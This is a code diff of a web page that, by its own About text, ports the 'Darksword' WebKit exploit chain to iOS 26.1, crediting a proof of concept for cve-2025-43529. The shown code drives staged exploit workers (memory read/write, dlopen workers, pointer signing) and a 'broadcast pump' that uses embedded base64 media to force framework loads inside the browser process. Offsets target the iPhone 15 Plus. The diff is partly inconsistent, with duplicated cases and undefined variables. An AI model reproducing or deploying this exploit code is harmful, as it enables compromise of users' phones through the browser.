+    if (m === 'request_stage2') { pollerReady = true; log('[poller] stage1 done — R/W live, idling'); return; } // do NOT send stage2
+    log('poller: ' + m);
+};
+poller.postMessage({ type: 'stage1' });
+
+                const dlopen_workers = [];
+
+                // --- broadcast pump v2: drive REAL first-use media pipelines. Each first use
+                // dlopens a fresh framework INSIDE WebContent (WebCore MediaToolbox/VideoToolbox
+                // softlink, ImageIO codec plugin, Vision, AudioToolbox) -> its ___cxa_atexit
+                // release broadcasts on the atexit mutex -> wakes the parked dlopen worker.
+                // No RTCPeerConnection (it leaked one instance per tick -> process freeze).
+                const PUMP_H264 = "AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAANLbW9vdgAAAGxtdmhkAAAAAAAAAAAAAAAAAAAD6AAAB9AAAQAAAQAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAnV0cmFrAAAAXHRraGQAAAADAAAAAAAAAAAAAAABAAAAAAAAB9AAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAABAAAAAAEAAAABAAAAAAAAkZWR0cwAAABxlbHN0AAAAAAAAAAEAAAfQAAAAAAABAAAAAAHtbWRpYQAAACBtZGhkAAAAAAAAAAAAAAAAAAAoAAAAUABVxAAAAAAALWhkbHIAAAAAAAAAAHZpZGUAAAAAAAAAAAAAAABWaWRlb0hhbmRsZXIAAAABmG1pbmYAAAAUdm1oZAAAAAEAAAAAAAAAAAAAACRkaW5mAAAAHGRyZWYAAAAAAAAAAQAAAAx1cmwgAAAAAQAAAVhzdGJsAAAAuHN0c2QAAAAAAAAAAQAAAKhhdmMxAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAEAAQABIAAAASAAAAAAAAAABFUxhdmM1OS4zNy4xMDAgbGlieDI2NAAAAAAAAAAAAAAAGP//AAAALmF2Y0MBQsAK/+EAFmdCwAraEJsBEAAAAwAQAAADAKDxImoBAAVozgOcgAAAABBwYXNwAAAAAQAAAAEAAAAUYnRydAAAAAAAAAssAAALLAAAABhzdHRzAAAAAAAAAAEAAAAKAAAIAAAAABRzdHNzAAAAAAAAAAEAAAABAAAAHHN0c2MAAAAAAAAAAQAAAAEAAAAKAAAAAQAAADxzdHN6AAAAAAAAAAAAAAAKAAACcQAAAAoAAAAKAAAACgAAAAoAAAAKAAAACgAAAAoAAAAKAAAACgAAABRzdGNvAAAAAAAAAAEAAAN7AAAAYnVkdGEAAABabWV0YQAAAAAAAAAhaGRscgAAAAAAAAAAbWRpcmFwcGwAAAAAAAAAAAAAAAAtaWxzdAAAACWpdG9vAAAAHWRhdGEAAAABAAAAAExhdmY1OS4yNy4xMDAAAAAIZnJlZQAAAtNtZGF0AAACUwYF//9P3EXpvebZSLeWLNgg2SPu73gyNjQgLSBjb3JlIDE2NCByMzA5NSBiYWVlNDAwIC0gSC4yNjQvTVBFRy00IEFWQyBjb2RlYyAtIENvcHlsZWZ0IDIwMDMtMjAyMiAtIGh0dHA6Ly93d3cudmlkZW9sYW4ub3JnL3gyNjQuaHRtbCAtIG9wdGlvbnM6IGNhYmFjPTAgcmVmPTEgZGVibG9jaz0wOjA6MCBhbmFseXNlPTA6MCBtZT1kaWEgc3VibWU9MCBwc3k9MSBwc3lfcmQ9MS4wMDowLjAwIG1peGVkX3JlZj0wIG1lX3JhbmdlPTE2IGNocm9tYV9tZT0xIHRyZWxsaXM9MCA4eDhkY3Q9MCBjcW09MCBkZWFkem9uZT0yMSwxMSBmYXN0X3Bza2lwPTEgY2hyb21hX3FwX29mZnNldD0wIHRocmVhZHM9MiBsb29rYWhlYWRfdGhyZWFkcz0xIHNsaWNlZF90aHJlYWRzPTAgbnI9MCBkZWNpbWF0ZT0xIGludGVybGFjZWQ9MCBibHVyYXlfY29tcGF0PTAgY29uc3RyYWluZWRfaW50cmE9MCBiZnJhbWVzPTAgd2VpZ2h0cD0wIGtleWludD0yNTAga2V5aW50X21pbj01IHNjZW5lY3V0PTAgaW50cmFfcmVmcmVzaD0wIHJjPWNyZiBtYnRyZWU9MCBjcmY9NDAuMCBxY29tcD0wLjYwIHFwbWluPTAgcXBtYXg9NjkgcXBzdGVwPTQgaXBfcmF0aW89MS40MCBhcT0wAIAAAAAWZYiEOiYoAAgYycnJ1111111111114AAAAAZBmiAUoIwAAAAGQZpAFKCMAAAABkGaYBSgjAAAAAZBmoAVoIwAAAAGQZqgFaCMAAAABkGawBWgjAAAAAZBmuAVoIwAAAAGQZsAFaCMAAAABkGbIBWgjA==";
+                const PUMP_HEVC = "AAAAHGZ0eXBpc29tAAACAGlzb21pc28ybXA0MQAADRNtb292AAAAbG12aGQAAAAAAAAAAAAAAAAAAAPoAAAH0AABAAABAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAMPXRyYWsAAABcdGtoZAAAAAMAAAAAAAAAAAAAAAEAAAAAAAAH0AAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAEAAAAAAQAAAAEAAAAAAACRlZHRzAAAAHGVsc3QAAAAAAAAAAQAAB9AAABAAAAEAAAAAC7VtZGlhAAAAIG1kaGQAAAAAAAAAAAAAAAAAACgAAABQAFXEAAAAAAAtaGRscgAAAAAAAAAAdmlkZQAAAAAAAAAAAAAAAFZpZGVvSGFuZGxlcgAAAAtgbWluZgAAABR2bWhkAAAAAQAAAAAAAAAAAAAAJGRpbmYAAAAcZHJlZgAAAAAAAAABAAAADHVybCAAAAABAAALIHN0YmwAAAoKc3RzZAAAAAAAAAABAAAJ+mh2YzEAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAQABAAEgAAABIAAAAAAAAAAEVTGF2YzU5LjM3LjEwMCBsaWJ4MjY1AAAAAAAAAAAAAAAY//8AAAl2aHZjQwEBYAAAAJAAAAAAAB7wAPz9+PgAAA8EoAABABhAAQwB//8BYAAAAwCQAAADAAADAB6VlAmhAAEAKUIBAQFgAAADAJAAAAMAAAMAHqAggQWWVlSkwvAWgIAAAAMAgAAAAwKEogABAAZEAcBzwIknAAEI/E4BBf//////////9yyi3gm1F0fbu1Wk/n/C/E54MjY1IChidWlsZCAxOTkpIC0gMy41KzEtZjBjMTAyMmI2OltMaW51eF1bR0NDIDEyLjIuMF1bNjQgYml0XSA4Yml0KzEwYml0KzEyYml0IC0gSC4yNjUvSEVWQyBjb2RlYyAtIENvcHlyaWdodCAyMDEzLTIwMTggKGMpIE11bHRpY29yZXdhcmUsIEluYyAtIGh0dHA6Ly94MjY1Lm9yZyAtIG9wdGlvbnM6IGNwdWlkPTExMTEwMzkgZnJhbWUtdGhyZWFkcz0xIG5vLXdwcCBuby1wbW9kZSBuby1wbWUgbm8tcHNuciBuby1zc2ltIGxvZy1sZXZlbD0yIGJpdGRlcHRoPTggaW5wdXQtY3NwPTEgZnBzPTUvMSBpbnB1dC1yZXM9NjR4NjQgaW50ZXJsYWNlPTAgdG90YWwtZnJhbWVzPTAgbGV2ZWwtaWRjPTAgaGlnaC10aWVyPTEgdWhkLWJkPTAgcmVmPTEgbm8tYWxsb3ctbm9uLWNvbmZvcm1hbmNlIG5vLXJlcGVhdC1oZWFkZXJzIGFubmV4YiBuby1hdWQgbm8taHJkIGluZm8gaGFzaD0wIG5vLXRlbXBvcmFsLWxheWVycyBvcGVuLWdvcCBtaW4ta2V5aW50PTUga2V5aW50PTI1MCBnb3AtbG9va2FoZWFkPTAgYmZyYW1lcz0zIGItYWRhcHQ9MCBiLXB5cmFtaWQgYmZyYW1lLWJpYXM9MCByYy1sb29rYWhlYWQ9NSBsb29rYWhlYWQtc2xpY2VzPTAgc2NlbmVjdXQ9MCBoaXN0LXNjZW5lY3V0PTAgcmFkbD0wIG5vLXNwbGljZSBuby1pbnRyYS1yZWZyZXNoIGN0dT0zMiBtaW4tY3Utc2l6ZT0xNiBuby1yZWN0IG5vLWFtcCBtYXgtdHUtc2l6ZT0zMiB0dS1pbnRlci1kZXB0aD0xIHR1LWludHJhLWRlcHRoPTEgbGltaXQtdHU9MCByZG9xLWxldmVsPTAgZHluYW1pYy1yZD0wLjAwIG5vLXNzaW0tcmQgbm8tc2lnbmhpZGUgbm8tdHNraXAgbnItaW50cmE9MCBuci1pbnRlcj0wIG5vLWNvbnN0cmFpbmVkLWludHJhIHN0cm9uZy1pbnRyYS1zbW9vdGhpbmcgbWF4LW1lcmdlPTIgbGltaXQtcmVmcz0wIG5vLWxpbWl0LW1vZGVzIG1lPTAgc3VibWU9MCBtZXJhbmdlPTU3IHRlbXBvcmFsLW12cCBuby1mcmFtZS1kdXAgbm8taG1lIG5vLXdlaWdodHAgbm8td2VpZ2h0YiBuby1hbmFseXplLXNyYy1waWNzIGRlYmxvY2s9MDowIG5vLXNhbyBuby1zYW8tbm9uLWRlYmxvY2sgcmQ9MiBzZWxlY3RpdmUtc2FvPTAgZWFybHktc2tpcCByc2tpcCBmYXN0LWludHJhIG5vLXRza2lwLWZhc3Qgbm8tY3UtbG9zc2xlc3Mgbm8tYi1pbnRyYSBuby1zcGxpdHJkLXNraXAgcmRwZW5hbHR5PTAgcHN5LXJkPTIuMDAgcHN5LXJkb3E9MC4wMCBuby1yZC1yZWZpbmUgbm8tbG9zc2xlc3MgY2JxcG9mZnM9MCBjcnFwb2Zmcz0wIHJjPWNyZiBjcmY9NDUuMCBxY29tcD0wLjYwIHFwc3RlcD00IHN0YXRzLXdyaXRlPTAgc3RhdHMtcmVhZD0wIGlwcmF0aW89MS40MCBwYnJhdGlvPTEuMzAgYXEtbW9kZT0xIGFxLXN0cmVuZ3RoPTAuMDAgY3V0cmVlIHpvbmUtY291bnQ9MCBuby1zdHJpY3QtY2JyIHFnLXNpemU9MzIgbm8tcmMtZ3JhaW4gcXBtYXg9NjkgcXBtaW49MCBuby1jb25zdC12YnYgc2FyPTEgb3ZlcnNjYW49MCB2aWRlb2Zvcm1hdD01IHJhbmdlPTAgY29sb3JwcmltPTIgdHJhbnNmZXI9MiBjb2xvcm1hdHJpeD0yIGNocm9tYWxvYz0wIGRpc3BsYXktd2luZG93PTAgY2xsPTAsMCBtaW4tbHVtYT0wIG1heC1sdW1hPTI1NSBsb2cyLW1heC1wb2MtbHNiPTggdnVpLXRpbWluZy1pbmZvIHZ1aS1ocmQtaW5mbyBzbGljZXM9MSBuby1vcHQtcXAtcHBzIG5vLW9wdC1yZWYtbGlzdC1sZW5ndGgtcHBzIG5vLW11bHRpLXBhc3Mtb3B0LXJwcyBzY2VuZWN1dC1iaWFzPTAuMDUgaGlzdC10aHJlc2hvbGQ9MC4wMyBuby1vcHQtY3UtZGVsdGEtcXAgbm8tYXEtbW90aW9uIG5vLWhkcjEwIG5vLWhkcjEwLW9wdCBuby1kaGRyMTAtb3B0IG5vLWlkci1yZWNvdmVyeS1zZWkgYW5hbHlzaXMtcmV1c2UtbGV2ZWw9MCBhbmFseXNpcy1zYXZlLXJldXNlLWxldmVsPTAgYW5hbHlzaXMtbG9hZC1yZXVzZS1sZXZlbD0wIHNjYWxlLWZhY3Rvcj0wIHJlZmluZS1pbnRyYT0wIHJlZmluZS1pbnRlcj0wIHJlZmluZS1tdj0xIHJlZmluZS1jdHUtZGlzdG9ydGlvbj0wIG5vLWxpbWl0LXNhbyBjdHUtaW5mbz0wIG5vLWxvd3Bhc3MtZGN0IHJlZmluZS1hbmFseXNpcy10eXBlPTAgY29weS1waWM9MSBtYXgtYXVzaXplLWZhY3Rvcj0xLjAgbm8tZHluYW1pYy1yZWZpbmUgbm8tc2luZ2xlLXNlaSBuby1oZXZjLWFxIG5vLXN2dCBuby1maWVsZCBxcC1hZGFwdGF0aW9uLXJhbmdlPTEuMDAgc2NlbmVjdXQtYXdhcmUtcXA9MGNvbmZvcm1hbmNlLXdpbmRvdy1vZmZzZXRzIHJpZ2h0PTAgYm90dG9tPTAgZGVjb2Rlci1tYXgtcmF0ZT0wIG5vLXZidi1saXZlLW11bHRpLXBhc3OAAAAACmZpZWwBAAAAABBwYXNwAAAAAQAAAAEAAAAUYnRydAAAAAAAAAJYAAACWAAAABhzdHRzAAAAAAAAAAEAAAAKAAAIAAAAABRzdHNzAAAAAAAAAAEAAAABAAAAFnNkdHAAAAAAIBAQGBgQEBgYEAAAAGBjdHRzAAAAAAAAAAoAAAABAAAQAAAAAAEAACgAAAAAAQAAEAAAAAABAAAAAAAAAAEAAAgAAAAAAQAAKAAAAAABAAAQAAAAAAEAAAAAAAAAAQAACAAAAAABAAAQAAAAABxzdHNjAAAAAAAAAAEAAAABAAAACgAAAAEAAAA8c3RzegAAAAAAAAAAAAAACgAAABAAAAAOAAAADgAAAA8AAAAOAAAADwAAABAAAAAQAAAADwAAAA8AAAAUc3RjbwAAAAAAAAABAAANPwAAAGJ1ZHRhAAAAWm1ldGEAAAAAAAAAIWhkbHIAAAAAAAAAAG1kaXJhcHBsAAAAAAAAAAAAAAAALWlsc3QAAAAlqXRvbwAAAB1kYXRhAAAAAQAAAABMYXZmNTkuMjcuMTAwAAAACGZyZWUAAACebWRhdAAAAAwoAawTYAYb/vl/0eAAAAAKAgHQIUmICbAloAAAAAoCAeBElWCAoSEgAAAACwAB4CT9eiQFWCVgAAAACgAB4Ga14ICpJWAAAAALAgHQQJJVYgJkJaAAAAAMAgHgwiVVWCAowCEgAAAADAAB4Kb116JAVIAlYAAAAAsAAeDiLVeCAqQlYAAAAAsCAdBIvVViAmwloA==";
+                const PUMP_AVIF = "AAAAIGZ0eXBhdmlmAAAAAGF2aWZtaWYxbWlhZk1BMUIAAAD5bWV0YQAAAAAAAAAvaGRscgAAAAAAAAAAcGljdAAAAAAAAAAAAAAAAFBpY3R1cmVIYW5kbGVyAAAAAA5waXRtAAAAAAABAAAAHmlsb2MAAAAARAAAAQABAAAAAQAAASEAAAAVAAAAKGlpbmYAAAAAAAEAAAAaaW5mZQIAAAAAAQAAYXYwMUNvbG9yAAAAAGppcHJwAAAAS2lwY28AAAAUaXNwZQAAAAAAAABAAAAAQAAAABBwaXhpAAAAAAMICAgAAAAMYXYxQ4EADAAAAAATY29scm5jbHgAAgACAAIAAAAAF2lwbWEAAAAAAAAAAQABBAECgwQAAAAdbWRhdAoGGBV//aAIMgscgAAAWAAACgV4hg==";
+                let __pumpTimer = null, __pumpKill = null, __pumpAC = null, __pumpV1 = null, __pumpV2 = null;
+                function __b64uri(b64, mime) { return `data:${mime};base64,${b64}`; }
+                function __b64blob(b64, mime) {
+                    const bin = atob(b64); const u8 = new Uint8Array(bin.length);
+                    for (let i = 0; i < bin.length; i++) u8[i] = bin.charCodeAt(i);
+                    return new Blob([u8], { type: mime });
+                }
+                async function __pumpPlay(which) {
+                    try {
+                        let v = which === 1 ? __pumpV1 : __pumpV2;
+                        if (!v) {
+                            v = document.createElement('video');
+                            v.muted = true; v.playsInline = true; v.loop = true;
+                            v.src = __b64uri(which === 1 ? PUMP_H264 : PUMP_HEVC, 'video/mp4');
+                            if (which === 1) __pumpV1 = v; else __pumpV2 = v;
+                        }
+                        await v.play();
+                    } catch (e) { }
+                }
+                async function __pumpFire() {
+                    await __pumpPlay(1);                                  // WebCore media softlink (h264)
+                    await __pumpPlay(2);                                  // hevc decoder path
+                    try {                                                  // MediaAccessibility.framework (WebCore softlink, in-process):
+                        if (!window.__pumpCC) {                            // caption rendering loads it on first cue display
+                            window.__pumpCC = document.createElement('video');
+                            window.__pumpCC.muted = true; window.__pumpCC.playsInline = true; window.__pumpCC.loop = true;
+                            window.__pumpCC.src = __b64uri(PUMP_H264, 'video/mp4');
+                            const tr = document.createElement('track');
+                            tr.kind = 'captions'; tr.label = 'x'; tr.srclang = 'en'; tr.default = true;
+                            tr.src = 'data:text/vtt,' + encodeURIComponent("WEBVTT\n\n00:00.000 --> 00:59.000\nwake\n");
+                            window.__pumpCC.appendChild(tr);
+                            document.body.appendChild(window.__pumpCC);
+                        }
+                        await window.__pumpCC.play();
+                        const t = window.__pumpCC.textTracks[0]; if (t) t.mode = 'showing';
+                    } catch (e) { }
+                    try { await createImageBitmap(__b64blob(PUMP_AVIF, 'image/avif')); } catch (e) { }   // ImageIO codec plugin (in-process)
+                    try { await new OffscreenCanvas(8, 8).convertToBlob({ type: 'image/heic' }); } catch (e) { }   // ImageIO encoder plugin
+                    try { await new OffscreenCanvas(8, 8).convertToBlob({ type: 'image/avif' }); } catch (e) { }
+                    try {                                                  // Vision.framework (in-process)
+                        const bd = new BarcodeDetector({ formats: ['qr_code'] });
+                        await bd.detect(await createImageBitmap(__b64blob(PUMP_AVIF, 'image/avif')));
+                    } catch (e) { }
+                    try {                                                  // audio stack
+                        if (!__pumpAC) __pumpAC = new (window.AudioContext || window.webkitAudioContext)();
+                        await __pumpAC.resume();
+                    } catch (e) { }
+                    try { await VideoDecoder.isConfigSupported({ codec: 'hev1.1.6.L120.90' }); } catch (e) { }
+                }
+                // window-only SYNCHRONOUS softlink battery (the writeup's alternative path):
+                // each call makes WebCore dlopen a fresh framework on the main thread, now.
+                function __pumpSyncWindow() {
+                    try { navigator.getGamepads(); } catch (e) { }                                // GameController.framework
+                    try { new (window.SpeechRecognition || window.webkitSpeechRecognition)(); } catch (e) { }   // Speech.framework
+                    try { new (window.ManagedMediaSource || window.MediaSource)(); } catch (e) { }  // media private frameworks
+                    try { window.addEventListener('devicemotion', () => { }); } catch (e) { }       // CoreMotion
+                    try { navigator.mediaDevices && navigator.mediaDevices.enumerateDevices(); } catch (e) { }   // AVFoundation
+                    try { navigator.geolocation.getCurrentPosition(() => { }, () => { }, { timeout: 1 }); } catch (e) { }   // CoreLocation (one-time prompt; delete if it gets in the way)
+                    try { const cx = document.createElement('canvas').getContext('2d'); cx.filter = 'blur(2px)'; cx.fillStyle = '#f00'; cx.fillRect(0, 0, 32, 32); } catch (e) { }   // CoreImage (http-safe, Safari 18+)
+                }
+                function startBroadcastPump() {
+                    if (__pumpTimer) return;
+                    log('[pump] broadcast pump ON');
+                    // typeof battery: most pump APIs are SECURE-CONTEXT-ONLY and are `undefined` over
+                    // plain http on a LAN origin -- log availability once so the run log says whether
+                    // the pump could even exist on this origin (run 014753 starved silently).
+                    log('[pump] typeof VD=' + (typeof VideoDecoder) + ' VE=' + (typeof VideoEncoder) +
+                        ' AD=' + (typeof AudioDecoder) + ' AE=' + (typeof AudioEncoder) +
+                        ' BD=' + (typeof BarcodeDetector) + ' SR=' + (typeof (window.SpeechRecognition || window.webkitSpeechRecognition)) +
+                        ' MMS=' + (typeof (window.ManagedMediaSource || window.MediaSource)) +
+                        ' md=' + (typeof (navigator.mediaDevices)) + ' PR=' + (typeof PaymentRequest) +
+                        ' AC=' + (typeof (window.AudioContext || window.webkitAudioContext)) +
+                        ' filter=' + (('filter' in (document.createElement('canvas').getContext('2d') || {}))));
+                    __pumpSyncWindow();
+                    __pumpFire();
+                    __pumpTimer = setInterval(__pumpFire, 2000);
+                    __pumpKill = setTimeout(() => stopBroadcastPump(), 30000);   // hard auto-stop
+                }
+                function stopBroadcastPump() {
+                    if (__pumpKill) { clearTimeout(__pumpKill); __pumpKill = null; }
+                    if (__pumpTimer) { clearInterval(__pumpTimer); __pumpTimer = null; log('[pump] broadcast pump OFF'); }
+                }
+                async function prepare_dlopen_workers() {
+                    for (let i = 1; i <= 2; ++i) {
+                        const worker = new Worker(dlopen_worker_url);
+                        dlopen_workers.push(worker);
+                        await new Promise(r => {
+                            worker.postMessage({
+                                type: 'init',
+                                data: 0x11111111 * i
+                            });
+                            worker.onmessage = r;
+                        });
+                        worker.onmessage = (e) => log("dlopen_worker" + i + ": " + e.data);
+                    }
+                }
+                const iframe = document.createElement('iframe');
+                iframe.srcdoc = '';
+                iframe.style.height = 0;
+                iframe.style.width = 0;
+                document.body.appendChild(iframe);
+
+                worker.postMessage({
+                    type: 'stage1',
+                });
+
+                worker.onmessage = async function (event) {
+                    const dataFromWorker = event.data;
+                    log("Received back from worker:" + dataFromWorker);
+                    if (dataFromWorker && typeof dataFromWorker === 'object') {
+    switch (dataFromWorker.type) {
+        case 'start_poll':
+            if (pollerReady) poller.postMessage({ ...dataFromWorker, type: 'poll_locks' });
+            else log('[page] start_poll dropped — poller not ready', 'fail');
+            break;
+        case 'pump_start': startBroadcastPump(); break;
+        case 'pump_stop': stopBroadcastPump(); break;
+        case 'sign_pointers':          // chain posts this as an OBJECT — your string case never matched either
+            await new Promise(r => setTimeout(r, 500));
+            worker.postMessage({ type: 'stage7' });
+            break;
+        default:
+            log('[page] unhandled object message: ' + JSON.stringify(dataFromWorker));
     }
-
-    runner.disabled = false;
-    window.__cve43529Running = false;
+    return;
 }
 
-window.addEventListener("load", () => {
-    setStatus("ready");
-    log("Ready; press Run now to start the primitive test", "warn");
-});
-</script>
+                    switch (dataFromWorker) {
+                        case "request_stage2":
+                            setStatus("Stage 1 done (R/W); running stage 2");
+                            worker.postMessage({ type: 'stage2' });
+                            break;
+                        case "prepare_dlopen_workers":
+                            setStatus("Spawning dlopen workers");
+                            await prepare_dlopen_workers();
+                            worker.postMessage({ type: 'stage3' });
+                            break;
+                        case "dlopen_workers_prepared":
+                            setStatus("Prepare CFBundle Loader");
+                            worker.postMessage({ type: 'stage4' });
+                            break;
+                        case "trigger_dlopen_worker1":
+                            setStatus("trigger dlopen worker1");
+                            dlopen_workers[0].postMessage({
+                                type: 'dlopen'
+                            });
+                            await new Promise(r => setTimeout(r, 500));
+                            worker.postMessage({ type: 'stage5' });
+                            break;
+                        case "trigger_dlopen_worker2":
+                            setStatus("trigger dlopen worker2");
+                            dlopen_workers[1].postMessage({
+                                type: 'dlopen'
+                            });
+                            await new Promise(r => setTimeout(r, 500));
+                            worker.postMessage({ type: 'stage6' });
+                            break;
+                        case "sign_pointers":
+                            await new Promise(r => setTimeout(r, 500));
+                            worker.postMessage({ type: 'stage7' });
+                            break;
+                                                // chain worker -> page:
+case 'start_poll':
+         worker.postMessage({ type: 'poll_locks', ...msg });
+        break;
+// poller -> page:
+case 'poll_ready':
+chainWorker.postMessage({ type: 'poll_ready' });
+break;
+                        case "done":
+                            setStatus("Finished");
+                            break;
+                    }
+                };
+            }
+            main();
+            runner.disabled = false;
+            window.__cve43529Running = false;
+        }
+
+        window.addEventListener("load", () => {
+            //get slide
+            // ---- Top bar: modal + title ----
+            const overlay = document.getElementById("overlay");
+            const modalTitle = document.getElementById("modalTitle");
+            const modalBody = document.getElementById("modalBody");
+
+            const MODALS = {
+                about: {
+                    title: "About",
+                    html:
+                        `<p>(Incomplete) port of the Darksword webkit userland chain for iOS 26.1</p>` +
+                        `<p class="muted">Repo: <a href="https://github.com/GenericCoding/pois0nSword">Proudly open source and hosted on Github</a></p>`
+                },
+                credits: {
+                    title: "Credits",
+                    html:
+                        `<p class="muted"><b>Contributors:</b></p>` +
+                        `<div class="rows">` +
+                        `<div class="row"><span class="k">Primary developer: </span><span class="v">GenericCoding<br>(<a href="https://x.com/GenericCoding">@GenericCoding</a>)</span></div>` +
+                        `<div class="row"><span class="k">Primary developer: </span><span class="v">Varik<br>(<a href="https://x.com/D4RK7ET">@D4RK7ET</a>)</span></div>` +
+                        `<div class="row"><span class="k">Debugging and webcontent R/W fix:</span><span class="v">Johnny<br>(<a href="https://x.com/zeroxjf">@zeroxjf</a>)</span></div>` +
+                        `<div class="row"><span class="k">Help with offsets:</span><span class="v">Huy Nguyen <br>(<a href="https://x.com/Little_34306">@Little_34306</a>)</span></div>` +
+                        `<p class="muted"><b>Acknowledgments:</b></p>` +
+                        `<div class="row"><span class="k">POC for cve-2025-43529 <a href="https://github.com/jir4vv1t">[repo]</a>:</span><span class="v">jir4vv1t <br>(<a href="https://x.com/jir4vv1t">@jir4vv1t</a>)</span></div>` +
+                        `</div>`
+                }
+            };
+
+            function openModal(key) {
+                const m = MODALS[key];
+                if (!m) return;
+                modalTitle.textContent = m.title;
+                modalBody.innerHTML = m.html;
+                overlay.dataset.open = "true";
+            }
+            function closeModal() {
+                if (overlay.dataset.open !== "true") return;
+                overlay.dataset.open = "closing";
+                setTimeout(() => {
+                    if (overlay.dataset.open === "closing") overlay.dataset.open = "false";
+                }, 240);
+            }
+
+            document.getElementById("aboutBtn").addEventListener("click", () => openModal("about"));
+            document.getElementById("creditsBtn").addEventListener("click", () => openModal("credits"));
+            document.getElementById("modalClose").addEventListener("click", closeModal);
+            overlay.addEventListener("click", (e) => { if (e.target === overlay) closeModal(); });
+            document.addEventListener("keydown", (e) => {
+                if (e.key === "Escape") closeModal();
+                if (e.key === "Enter" && overlay.dataset.open === "true") closeModal();
+            });
+            log('Press "run" to start, only iOS 26.1 is tested. Offsets are for the iPhone 15 plus only currently, and work on vphone.');
+
+        });
+    </script>
 </body>
 </html>
